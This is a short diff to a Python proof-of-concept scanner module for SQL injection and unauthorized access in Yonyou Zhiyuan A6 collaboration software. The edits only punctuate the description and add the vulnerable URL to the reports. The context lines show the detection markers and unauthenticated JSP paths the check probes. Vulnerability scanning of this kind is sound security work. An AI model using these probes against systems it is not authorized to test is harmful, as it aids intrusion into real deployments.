@@ -12,7 +12,7 @@ class Vuln(ABVuln):
     type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-03'  # 漏洞公布时间
     desc = '''
-        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
+        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等。
         用友致远A6协同系统高危SQL注射，报错注入。
     '''  # 漏洞描述
     ref = 'Unknown'  # 漏洞来源
@@ -60,8 +60,8 @@ class Poc(ABPoc):
                 code, head, res, errcode, _ = hh.http(url)
                 if (code == 500 or code == 200) and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                     #security_hole(url + '   found sql injection!')
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=url))
 
             payloads2 = [
                 '/yyoa/common/SelectPerson/reloadData.jsp',
@@ -74,8 +74,8 @@ class Poc(ABPoc):
                 code, head, res, errcode, _ = hh.http(url)
                 if code == 200 and (('insertObject' in res) or ('personList' in res) or ('FTP' in res)):
                     #security_hole(url + "   Unauthorized access! ")
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
